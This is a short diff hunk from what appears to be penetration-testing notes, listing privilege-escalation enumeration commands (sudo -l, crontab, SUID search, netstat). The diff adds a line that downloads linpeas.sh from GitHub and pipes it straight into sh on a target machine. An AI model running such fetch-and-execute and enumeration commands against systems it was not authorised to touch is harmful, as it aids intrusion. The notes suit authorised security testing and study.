@@ -71,6 +71,7 @@ sudo -l
 cat /etc/crontab
 find / -perm -u=s -type f 2>/dev/null
 netstat -tuln
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh  (use only if the target machine has internet if not use this command in your machine and transfer to target machine)
 ```
 
 ligolo-ng port forwarding tool commands:
